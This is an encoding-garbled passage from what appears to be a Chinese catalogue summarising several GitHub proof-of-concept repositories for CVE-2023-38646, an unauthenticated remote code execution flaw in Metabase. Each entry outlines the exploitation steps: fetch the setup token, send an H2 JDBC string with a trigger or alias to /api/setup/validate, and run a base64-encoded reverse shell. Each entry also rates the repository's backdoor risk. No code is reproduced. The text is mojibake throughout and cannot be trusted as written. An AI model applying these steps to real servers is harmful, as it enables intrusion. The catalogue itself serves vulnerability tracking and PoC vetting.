**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ— éœ€è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨ `subname` å­—æ®µä¸­æ³¨å…¥æ¶æ„çš„ JDBC URLã€‚è¯¥URLåŒ…å«ä¸€ä¸ªCREATE TRIGGERè¯­å¥ï¼Œè¯¥è¯­å¥åœ¨INFORMATION_SCHEMA.TABLESè¡¨ä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æä¾›ä¸€ä¸ªåŒ…å«åå¼¹shellå‘½ä»¤çš„payloadï¼Œè¯¥å‘½ä»¤ä¼šè¢«base64ç¼–ç åæ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨ä»£ç ä¸­çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¸»è¦æ˜¯é€šè¿‡ç¯¡æ”¹IPå’Œç«¯å£è¿›è¡Œæ¶æ„è¿æ¥ï¼Œå­˜åœ¨å°‘é‡é£é™©ã€‚ è„šæœ¬è¦æ±‚ç”¨æˆ·æŒ‡å®šç›®æ ‡ URL å’Œ tokenï¼Œ token é€šè¿‡ `/api/session/properties` è·å–ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  è·å–ç›®æ ‡ Metabase å®ä¾‹çš„ URL å’Œ tokenï¼ˆé€šè¿‡è®¿é—® `/api/session/properties` è·å–ï¼‰ã€‚
2.  é…ç½®æ¼æ´åˆ©ç”¨è„šæœ¬ `exploit.py`ï¼Œè®¾ç½®ç›®æ ‡ URLã€tokenã€æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚
3.  è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å°†å‘é€åŒ…å«æ¶æ„ JDBC URL çš„ POST è¯·æ±‚åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚
4.  ç›®æ ‡ Metabase å®ä¾‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å’Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè™½ç„¶å­˜åœ¨é€šè¿‡ä¿®æ”¹IPç«¯å£è¿›è¡Œæ¶æ„è¿æ¥çš„é£é™©ï¼Œ ä½†æ˜¯éœ€è¦ä½¿ç”¨è€…è‡ªè¡Œé…ç½®ã€‚æ‰€ä»¥æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [junnythemarksman/CVE-2023-38646](https://github.com/junnythemarksman/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #22

**æ¥æº**: [CVE-2023-38646-kh4sh3i_CVE-2023-38646.md](../2023/CVE-2023-38646-kh4sh3i_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå­˜åœ¨äº0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„HTTPè¯·æ±‚åˆ°/api/setup/validateç«¯ç‚¹ï¼Œå…¶ä¸­åŒ…å«æ¶æ„æ„é€ çš„JSON payloadã€‚è¯¥payloadåˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE ALIAS`è¯­å¥åˆ›å»ºä¸€ä¸ªåä¸º`SHELLEXEC`çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚PoCä»£ç é€šè¿‡curlå‘½ä»¤å›è¿æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ŒéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚è™½ç„¶POCä¸­ä½¿ç”¨äº†curlè¿›è¡Œå›è¿ï¼Œä½†æ”»å‡»è€…å¯ä»¥æ›¿æ¢æˆä»»ä½•å‘½ä»¤è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚æŠ•æ¯’é£é™©è¾ƒä½ï¼Œåªæœ‰æå°çš„å¯èƒ½æ€§ä½œè€…åœ¨ä»£ç ä¸­æ¤å…¥å…¶ä»–æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚åœ¨LICENSEæ–‡ä»¶ä¸­éšè—ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œä½†è¿™å¯ä»¥é€šè¿‡ä»”ç»†å®¡æŸ¥ä»£ç æ¥é¿å…ã€‚PoCä»£ç ä¸»è¦é€šè¿‡H2æ•°æ®åº“çš„ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼ŒLICENSEæ–‡ä»¶ä¸»è¦å£°æ˜äº†ç‰ˆæƒåè®®ã€‚

**é¡¹ç›®åœ°å€:** [kh4sh3i/CVE-2023-38646](https://github.com/kh4sh3i/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #23

**æ¥æº**: [CVE-2023-38646-nickswink_CVE-2023-38646.md](../2023/CVE-2023-38646-nickswink_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚å¤šä¸ªèµ„æºç¡®è®¤äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œä¸¥é‡æ€§ã€‚

æä¾›çš„ PoC ä»£ç  `exploit.py` å°è¯•åˆ©ç”¨æ­¤æ¼æ´ã€‚å®ƒé¦–å…ˆè·å– Metabase å®ä¾‹çš„ `setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚Payloadä½¿ç”¨base64ç¼–ç åå¼¹shellå‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š**  PoC è„šæœ¬é¦–å…ˆå‘ç›®æ ‡ Metabase å®ä¾‹çš„ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œè§£æè¿”å›çš„ JSON æ•°æ®ä»¥æå– `setup-token`ã€‚æ­¤ token ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š**  è¯¥è„šæœ¬æ„é€ ä¸€ä¸ª JSON payloadï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT=1` å’Œ `CREATE TRIGGER` ç­‰ H2 ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  **å‘é€ Payloadï¼š**  è„šæœ¬å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨åï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ payload ä¸­çš„å‘½ä»¤ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

PoC ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå¹¶æ— æ˜æ˜¾çš„æ¶æ„æŠ•æ¯’ä»£ç ï¼Œä½†æ˜¯ä»å­˜åœ¨ä¸€å®šçš„é£é™©, å› ä¸ºPoC æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ›¿æ¢åå¼¹shellçš„payloadä¸ºæ¶æ„payload,ä¾‹å¦‚åˆ é™¤æœåŠ¡å™¨æ•°æ®ï¼Œå› æ­¤æŠ•æ¯’é£é™©å­˜åœ¨ï¼Œé¢„ä¼°æ¯”ä¾‹ä¸º5%ã€‚æ­¤è¯„ä¼°åŸºäºä»£ç æœ¬èº«ï¼Œä¸åŒ…æ‹¬ä»£ç æ‰˜ç®¡å¹³å°å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œå¦‚è´¦å·è¢«ç›—ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [nickswink/CVE-2023-38646](https://github.com/nickswink/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #24

**æ¥æº**: [CVE-2023-38646-passwa11_CVE-2023-38646.md](../2023/CVE-2023-38646-passwa11_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1, < 1.46.6.1 (åŠå…¶ä»–ä¿®å¤ç‰ˆæœ¬è§æ¼æ´åº“ä¿¡æ¯)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚ä¿®å¤ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆé€šè¿‡è®¿é—® `/api/session/properties` ç«¯ç‚¹è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON payloadã€‚è¯¥ payload åˆ©ç”¨ H2 æ•°æ®åº“çš„ä¸€ä¸ªç‰¹æ€§ï¼Œé€šè¿‡åˆ›å»ºè§¦å‘å™¨åœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚è¯¥ JavaScript ä»£ç ä¼šæ‰§è¡Œ bash å‘½ä»¤ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **å‘é€ Payloadï¼š** æ”»å‡»è€…å°†æ„é€ çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚åˆ©ç”¨ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç ï¼Œç»•è¿‡æ£€æµ‹ã€‚

**POC ä»£ç æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç ä¼¼ä¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå®ç°äº†ä¸Šè¿°åˆ©ç”¨è¿‡ç¨‹ã€‚å®ƒé¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒ…å«åå‘ shell å‘½ä»¤çš„ payloadï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥å­˜å‚¨åº“çš„ä¸»è¦ä»£ç æ–‡ä»¶æ˜¯ `exploit.py`ã€‚ä»”ç»†æ£€æŸ¥æ­¤æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ CVE-2023-38646 æ¼æ´ï¼Œå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ä½†æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½œè€…å¦‚æœå°†åå¼¹shellçš„IPæˆ–è€…ç«¯å£å†™æ­»ï¼Œå°±æœ‰å¯èƒ½è¢«ä½œè€…æ§åˆ¶ã€‚
`README.md` æ–‡ä»¶ä»…åŒ…å«æœ‰å…³æ¼æ´å’Œä½¿ç”¨è„šæœ¬çš„è¯´æ˜ã€‚å®ƒè¿˜åŒ…å«å¯¹åŸå§‹æ¼æ´å‘ç°å’Œç›¸å…³æ¼æ´åˆ©ç”¨çš„ credit é“¾æ¥ï¼Œè¿™è¡¨æ˜ä½œè€…æ²¡æœ‰è¯•å›¾éšè—è„šæœ¬çš„ç›®çš„ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [passwa11/CVE-2023-38646](https://github.com/passwa11/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #25

**æ¥æº**: [CVE-2023-38646-securezeron_CVE-2023-38646.md](../2023/CVE-2023-38646-securezeron_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** ç¬¬ä¸€ä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-POC.py`ï¼‰ç”¨äºè·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚å®ƒå°è¯•é€šè¿‡HTTPå’ŒHTTPSè¿æ¥åˆ°ç›®æ ‡IPåœ°å€ï¼Œå¹¶è¯·æ±‚`/api/session/properties`ç«¯ç‚¹ï¼Œè§£æè¿”å›çš„JSONæ•°æ®ï¼Œä»ä¸­æå–`setup-token`ã€‚
2.  **åˆ©ç”¨Setup Tokenæ‰§è¡Œå‘½ä»¤ï¼š** ç¬¬äºŒä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-Reverse-Shell.py`ï¼‰åˆ©ç”¨è·å–åˆ°çš„Setup Tokenï¼Œå‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®ã€‚è¯¥é…ç½®ä½¿ç”¨H2æ•°æ®åº“å¼•æ“ï¼Œå¹¶åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨`pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œä¹‹å‰è§¦å‘ï¼Œä»è€Œæ‰§è¡ŒBase64ç¼–ç çš„payloadï¼Œpayloadè§£ç åæ‰§è¡Œåå‘shellå‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

ä»æä¾›çš„æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’ŒPOCä»£ç æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æœç´¢ç»“æœä¸­åŒ…å«äº†å¤šä¸ªå…³äºæ­¤æ¼æ´çš„æè¿°ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠPOCä»£ç çš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

*   ç¬¬ä¸€ä¸ªè„šæœ¬`CVE-2023-38646-POC.py`åªæ˜¯ç”¨æ¥è·å–setup tokenï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ã€‚
*   ç¬¬äºŒä¸ªè„šæœ¬`CVE-2023-38646-Reverse-Shell.py`åŒ…å«åå‘shellçš„payloadï¼Œè¿™éƒ¨åˆ†æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆï¼Œä¸èƒ½ç®—ä½œæŠ•æ¯’ä»£ç ã€‚å¯èƒ½çš„æŠ•æ¯’é£é™©åœ¨äºï¼š
    *   **Payloadæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼š** è™½ç„¶å½“å‰Payloadæ˜¯åå‘shellï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¿®æ”¹Payloadï¼Œæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®çªƒå–ã€å‹’ç´¢è½¯ä»¶ç­‰ã€‚
    *   **ä¾èµ–é¡¹é£é™©ï¼š** è„šæœ¬ä¾èµ–requestsåº“ï¼Œå¦‚æœrequestsåº“æœ¬èº«è¢«æŠ•æ¯’ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨é£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªè„šæœ¬æœ¬èº«ï¼Œæ¯”å¦‚åå‘shell çš„IPåœ°å€ã€ç«¯å£è¢«æ›¿æ¢æˆæ”»å‡»è€…æ§åˆ¶çš„è‚‰é¸¡ä»è€Œè¿›è¡Œè·³æ¿æ”»å‡»ï¼Œä»¥åŠå®‰è£…æ¶æ„ä¾èµ–é¡¹çš„å¯èƒ½ã€‚

æ€»ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯åˆ©ç”¨æœªæˆæƒçš„setupæ¥å£ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #26

**æ¥æº**: [CVE-2023-38646-threatHNTR_CVE-2023-38646.md](../2023/CVE-2023-38646-threatHNTR_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ PoC ä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Metabase å®‰è£…è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå³åœ¨è®¾ç½®è¿‡ç¨‹ä¸­å¯ä»¥æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”æœªå¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²è¿›è¡Œå……åˆ†çš„éªŒè¯ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

*   è¯¥PoCé¦–å…ˆè·å– `setup-token` å’Œ Metabase ç‰ˆæœ¬ä¿¡æ¯ã€‚
*   ç„¶åï¼Œå¯¹åŒ…å«åå‘shellå‘½ä»¤çš„payloadè¿›è¡Œbase64ç¼–ç ã€‚
*   æ¥ç€ï¼Œå®ƒæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadï¼Œè¯¥å­—ç¬¦ä¸²åˆ©ç”¨äº†`CREATE TRIGGER` è¯­å¥å’Œå†…åµŒçš„JavaScriptä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚
*   æœ€åï¼Œå®ƒå°†æ­¤payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°æ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚

å‚è€ƒæœç´¢ç»“æœ [7] æä¾›äº† GitHub é“¾æ¥ï¼Œè¿›ä¸€æ­¥è¯å®äº† PoC çš„å­˜åœ¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è™½ç„¶PoCæœ¬èº«çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æŠ•æ¯’é£é™©ã€‚PoCä»£ç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå¼¹shellçš„IPåœ°å€å’Œç«¯å£ã€‚å¦‚æœæ”»å‡»è€…æ¶æ„ä¿®æ”¹PoCä»£ç ï¼Œä¾‹å¦‚æ·»åŠ é¢å¤–çš„åé—¨æˆ–æ¶æ„åŠŸèƒ½ï¼Œå¹¶å°†å…¶ä¼ æ’­ç»™å…¶ä»–ç”¨æˆ·ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´å¤§èŒƒå›´çš„æ”»å‡»ã€‚é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–ç¬¬ä¸‰æ–¹åº“:** æ£€æŸ¥ PoC ä»£ç ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚
*   **Payloadä¿®æ”¹:** ç”¨æˆ·å¯èƒ½ç›´æ¥ä½¿ç”¨ PoC ä»£ç ï¼Œè€Œä¸æ£€æŸ¥å…¶å†…å®¹ã€‚æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ payloadï¼Œä¾‹å¦‚æ¤å…¥æŒ–çŸ¿ç¨‹åºæˆ–è€…å…¶ä»–æ¶æ„è½¯ä»¶ã€‚
*   **ç¤¾åŒºä¼ æ’­:** ä¿®æ”¹åçš„ PoC ä»£ç å¯èƒ½åœ¨å®‰å…¨ç¤¾åŒºä¸­ä¼ æ’­ï¼Œå¯¼è‡´æ›´å¤šç”¨æˆ·å—åˆ°å½±å“ã€‚

